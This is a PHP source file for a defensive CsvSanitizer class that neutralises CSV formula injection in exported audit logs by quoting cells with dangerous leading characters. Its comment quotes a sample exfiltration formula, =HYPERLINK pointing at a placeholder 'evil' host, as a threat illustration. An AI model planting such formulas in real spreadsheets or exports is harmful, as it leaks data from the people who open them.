<?php

namespace App\Service;

/**
 * Protection against CSV injection ("formula injection", OWASP).
 *
 * Spreadsheet applications treat a cell starting with = + - @ (and, in some versions, a TAB or CR) as a formula.
 * Attacker-controlled values end up in the audit log (an "email" typed on the login form, a User-Agent header,
 * a product name...). Without this, opening the export could run =HYPERLINK("http://evil/?"&A1) or a DDE payload on
 * the admin's computer. Prefixing such cells with a single quote makes the spreadsheet display them as plain text.
 */
final class CsvSanitizer
{
    private const DANGEROUS_FIRST_CHARS = ['=', '+', '-', '@', "\t", "\r"];

    public static function cell(string $value): string
    {
        // Control characters (except tab/newline handled by the CSV quoting) are removed.
        $value = (string) preg_replace('/[\x00-\x08\x0B\x0C\x0E-\x1F\x7F]/', '', $value);

        if ('' !== $value && in_array($value[0], self::DANGEROUS_FIRST_CHARS, true)) {
            return "'".$value;
        }

        return $value;
    }

    /**
     * @param list<string> $row
     *
     * @return list<string>
     */
    public static function row(array $row): array
    {
        return array_map(self::cell(...), $row);
    }
}
